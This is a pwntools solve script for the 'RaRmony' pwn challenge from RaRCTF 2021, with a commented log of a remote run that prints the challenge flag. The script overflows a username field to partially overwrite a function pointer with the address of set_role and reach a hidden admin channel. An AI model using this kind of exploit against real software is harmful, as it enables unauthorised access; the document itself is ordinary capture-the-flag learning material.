from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './harmony'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "193.57.159.27"
  PORT = 28484
  s = remote(HOST, PORT)
else:
  s = process(BINARY)

def Read_channel(channel):
  s.sendlineafter("> ", "0")
  s.sendlineafter("> ", str(channel))

def View_User():
  s.sendlineafter("> ", "1")

def Change_role(role):
  s.sendlineafter("> ", "2")
  s.sendlineafter("Enter new role name: ", role)

def Change_username(username):
  s.sendlineafter("> ", "3")
  s.sendlineafter("Enter new username: ", username)

buf  = "B"*0x20
buf += p64(elf.sym.set_role)[:3]
#pause()
Change_username(buf)

s.sendlineafter("> ", "3")
Read_channel(2)

s.interactive()

'''
mito@ubuntu:~/CTF/RaRCTF_2021/Pwn_RaRmony_500/rarmony$ python solve.py r
[*] '/home/mito/CTF/RaRCTF_2021/Pwn_RaRmony_500/rarmony/harmony'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 193.57.159.27 on port 28484: Done
[*] Switching to interactive mode
secret-admin-chat
Tony: In case I forget it, here's the flag for Harmony
Tony: rarctf{:O,Y0U-f0und-4-z3r0-d4y!!1!_0038abff7c}
wiwam845: no leek nerd smh
Tony: sad!
'''

